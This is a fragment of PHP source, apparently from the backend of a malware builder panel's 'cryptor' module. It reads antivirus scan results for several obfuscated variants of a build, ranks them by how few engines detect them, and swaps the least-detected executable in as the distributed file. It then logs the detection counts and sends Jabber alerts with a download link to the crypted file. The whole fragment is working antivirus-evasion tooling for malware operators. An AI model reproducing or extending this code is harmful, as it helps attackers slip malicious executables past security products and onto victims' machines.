	    $result = curl_load($dir['site'] . 'cache/cryptor/' . $row->id . '/' . $row->md5 . '.zip');

	    if(file_exists($dir['site'] . 'cache/cryptor/' . $row->id . '/' . $row->md5 . '.zip')) unlink($dir['site'] . 'cache/cryptor/' . $row->id . '/' . $row->md5 . '.zip');
	    
	    if($result != false){
		$result = json_decode($result, false);
		$fu = array();
		$avc = 0;
		$avcs = '';
		
		//if($debug == true) debug_save(print_r($result, true));

		foreach($result as $av_key => $av_item){
		    $av_key = av_replace($av_key);

		    if(strpos(' ' . $avcs, $av_key . '|') == false){
			$avc++;
			$avcs .= $av_key . '|';
		    }

		    if(is_object($av_item)){
			foreach($av_item as $av_file => $detect){
			    $av_file = explode('.', $av_file, 2);

			    if(!isset($fu[$av_file['0']])){
				$fu[$av_file['0']]['av'] = '';
				$fu[$av_file['0']]['avt'] = '';
				$fu[$av_file['0']]['avcf'] = '0';
			    }

			    if(strpos(' ' . $fu[$av_file['0']]['av'], $av_key . '|') == false){
				$fu[$av_file['0']]['av'] .= $av_key . '|';
				$fu[$av_file['0']]['avt'] .= $av_key . ' ('.$detect.')|';
				$fu[$av_file['0']]['avcf']++;
			    }
			}
		    }elseif($av_item != 'OK'){
			$av_item = explode('=', $av_item, 2);
			$av_file = explode('.', $av_item[0], 2);

			if(!isset($fu[$av_file[0]])){
			    $fu[$av_file['0']]['av'] = '';
			    $fu[$av_file['0']]['avt'] = '';
			    $fu[$av_file['0']]['avcf'] = '0';
			    $fu[$av_file['0']]['prio'] = '0';
			}

			if(strpos(' ' . $fu[$av_file['0']]['av'], $av_key . '|') == false){
			    $fu[$av_file['0']]['av'] .= $av_key . '|';
			    $fu[$av_file['0']]['avt'] .= $av_key . ' ('.$av_item[1].')|';
			    $fu[$av_file['0']]['avcf']++;
			}
		    }

		    $av_prio = array();
		    foreach($fu as $kvc => $ivc){
			$ivc['av'] = explode('|', trim($ivc['av'], '|'));
			foreach($ivc['av'] as $kvp => $ivp){
			    $ivp = av_replace($ivp);
			    $av_prio[$kvc] += math_prio($ivp);
			    $fu[$kvc]['prio'] = $av_prio[$kvc];
			}
		    }

		    $av_mp = min($av_prio);
		    $av_mp = array_search($av_mp, $av_prio);

		    if($debug == true) debug_save('AV Prio: ' . print_r($av_prio, true));
		    if($debug == true) debug_save('AV MP: ' . print_r($av_mp, true));
		    if($debug == true) debug_save('FU: ' . print_r($fu, true));
		    
		    if(!empty($av_prio[$av_mp])){
			if($row->prio == 0) $row->prio = 99;
			if(!empty($row->file_crypt) && $av_prio['previous_minav'] != $row->prio) $row->prio = 99;
			if($row->prio > $av_prio[$av_mp]){
			    if(copy($dir['site'] . 'cache/cryptor/' . $row->id . '/' . $av_mp . '.exe', $dir['cfg'] . $row->file_orig)){
				if($row->type == 5){
				    $row->md5_crypt = md5_file($dir['cfg'] . $row->file_orig);
				    if($debug == true) debug_save('update bf_builds set history = \''.base64_encode(json_encode($fu)).'\', status = \'99\', md5_crypt = \''.$row->md5_crypt.'\', file_crypt = \''.$row->file_orig.'\', prio = \''.$av_prio[$av_mp].'\', av = \''.$fu[$av_mp]['av'].'\', avt = \''.$fu[$av_mp]['avt'].'\', avc = \''.$avc.'\', avcs = \''.$avcs.'\', avcf = \''.$fu[$av_mp]['avcf'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
				    $mysqli->query('update bf_builds set history = \''.base64_encode(json_encode($fu)).'\', status = \'99\', md5_crypt = \''.$row->md5_crypt.'\', file_crypt = \''.$row->file_orig.'\', prio = \''.$av_prio[$av_mp].'\', av = \''.$fu[$av_mp]['av'].'\', avt = \''.$fu[$av_mp]['avt'].'\', avc = \''.$avc.'\', avcs = \''.$avcs.'\', avcf = \''.$fu[$av_mp]['avcf'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
				}else{
				    $row->md5_crypt = md5_file($dir['cfg'] . $row->file_orig);
				    if($debug == true) debug_save('update bf_builds set history = \''.base64_encode(json_encode($fu)).'\', status = \'98\', md5_crypt = \''.$row->md5_crypt.'\', file_crypt = \''.$row->file_orig.'\', prio = \''.$av_prio[$av_mp].'\', av = \''.$fu[$av_mp]['av'].'\', avt = \''.$fu[$av_mp]['avt'].'\', avc = \''.$avc.'\', avcs = \''.$avcs.'\', avcf = \''.$fu[$av_mp]['avcf'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
				    $mysqli->query('update bf_builds set history = \''.base64_encode(json_encode($fu)).'\', status = \'98\', md5_crypt = \''.$row->md5_crypt.'\', file_crypt = \''.$row->file_orig.'\', prio = \''.$av_prio[$av_mp].'\', av = \''.$fu[$av_mp]['av'].'\', avt = \''.$fu[$av_mp]['avt'].'\', avc = \''.$avc.'\', avcs = \''.$avcs.'\', avcf = \''.$fu[$av_mp]['avcf'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');

				    if(!empty($cfg['jabber']['bt_tracking'])){
					$text = 'ID File: ' . $row->id . "\r\n";
					$text .= 'Orig File: ' . $row->file_orig . "\r\n";
					$text .= 'MD5 Orig File: ' . $row->md5 . "\r\n";
					$text .= 'MD5 Crypt File: ' . $row->md5_crypt . "\r\n";
					//$text .= 'Orig Link: ' . $cfg['domain_link'] . '/cfg/' . $row->file_orig . "\r\n";
					$text .= 'Crypt Link: ' . $cfg['domain_link'] . '/cfg/' . $row->file_orig . "\r\n";
					$text .= 'PRIO: ' . $av_prio[$av_mp] . "\r\n";
					$text .= 'AV Detect: ' . $fu[$av_mp]['avcf'] . "\r\n";
					$text .= 'AV All: ' . $avc . "\r\n";
					$text .= "AV Detect List: \r\n\r\n" . str_replace('|', "\r\n ", ' ' . $fu[$av_mp]['av']);

					if(strpos($cfg['jabber']['bt_tracking'], ',') != false){
					    $jt = explode(',', $cfg['jabber']['bt_tracking']);
					    if($jt > 0){
						foreach($jt as $jab){
						    @file_put_contents($dir['site'] . 'cache/jabber/to_' . $jab . '_' . mt_rand(5, 15) . time(), $text);
						}
					    }
					}else{
					    @file_put_contents($dir['site'] . 'cache/jabber/to_' . $cfg['jabber']['bt_tracking'] . '_' . mt_rand(5, 15) . time(), $text);
					}
				    }
				}
			    }else{
				$mysqli->query('update bf_builds set status = \'96\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
			    }
			}else{
			    $row->md5_crypt = md5_file($dir['cfg'] . $row->file_orig);
			    if($debug == true) debug_save('update bf_builds set history = \''.base64_encode(json_encode($fu)).'\', status = \'98\', md5_crypt = \''.$row->md5_crypt.'\', file_crypt = \''.$row->file_orig.'\', prio = \''.$av_prio[$av_mp].'\', av = \''.$fu[$av_mp]['av'].'\', avt = \''.$fu[$av_mp]['avt'].'\', avc = \''.$avc.'\', avcs = \''.$avcs.'\', avcf = \''.$fu[$av_mp]['avcf'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
			    $mysqli->query('update bf_builds set history = \''.base64_encode(json_encode($fu)).'\', status = \'98\', md5_crypt = \''.$row->md5_crypt.'\', file_crypt = \''.$row->file_orig.'\', prio = \''.$av_prio[$av_mp].'\', av = \''.$fu[$av_mp]['av'].'\', avt = \''.$fu[$av_mp]['avt'].'\', avc = \''.$avc.'\', avcs = \''.$avcs.'\', avcf = \''.$fu[$av_mp]['avcf'].'\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
			}
		    }else{
			$mysqli->query('update bf_builds set status = \'97\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
		    }
		}
	    }else{
		$mysqli->query('update bf_builds set status = \'94\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
	    }

	    for($i = 1; $i <= $max_file; $i++){
		if(file_exists($dir['site'] . 'cache/cryptor/' . $row->id . '/' . $i . '.exe')) @unlink($dir['site'] . 'cache/cryptor/' . $row->id . '/' . $i . '.exe');
	    }
	    if(file_exists($dir['site'] . 'cache/cryptor/' . $row->id . '/' . 'previous_minav.exe')) @unlink($dir['site'] . 'cache/cryptor/' . $row->id . '/' . 'previous_minav.exe');
	}else{
	    $mysqli->query('update bf_builds set status = \'93\', up_date = CURRENT_TIMESTAMP() WHERE (`id` = \''.$row->id.'\') LIMIT 1');
	}
    }
}

//sleep(10);

unlink($dir['site'] . $pid_file);

?>